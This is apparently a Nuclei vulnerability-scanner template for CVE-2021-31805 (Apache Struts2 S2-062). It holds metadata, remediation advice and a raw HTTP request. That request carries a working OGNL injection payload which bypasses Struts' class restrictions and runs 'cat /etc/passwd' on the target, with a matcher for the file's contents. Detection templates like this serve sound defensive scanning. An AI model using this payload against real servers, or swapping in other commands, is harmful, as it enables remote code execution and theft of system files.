id: CVE-2021-31805
info:
  name: Apache Struts2 S2-062 - Remote Code Execution
  author: taielab
  severity: critical
  description: Apache Struts2 S2-062 vulnerability allows remote code execution and
    the fix issued for CVE-2020-17530 (S2-061) was incomplete, leaving some attributes
    of the tag vulnerable.
  reference:
  - https://cwiki.apache.org/confluence/display/WW/S2-062
  - https://github.com/Axx8/Struts2_S2-062_CVE-2021-31805
  - https://nvd.nist.gov/vuln/detail/CVE-2021-31805
  remediation: Avoid using forced OGNL evaluation on untrusted user input, and/or
    upgrade to Struts 2.5.30 or greater which checks if expression evaluation won't
    lead to the double evaluation.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-31805
    cwe-id: CWE-917
  tags: cve,cve2021,apache,rce,struts,struts2
  metadata:
    impact: The impact of the CVE-2021-31805 vulnerability in Apache Struts2 S2-062
      is the potential for remote code execution due to incomplete fixes for a previous
      vulnerability.
    recommendation: It is recommended to immediately update Apache Struts2 to the
      latest version to address the remote code execution vulnerability CVE-2021-31805
      and the incomplete fix of S2-061 (CVE-2020-17530).
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\n\
    Content-Length: 1095\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition:\
    \ form-data; name=\"id\"\n\n%{\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)\
    \ +\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0)\
    \ +\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)\
    \ +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0)\
    \ +\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)\
    \ +\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0)\
    \ +\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())\
    \ == true).toString().substring(0,0) +\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet())\
    \ == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat\
    \ /etc/passwd'}))\n}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\u2014\n"
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
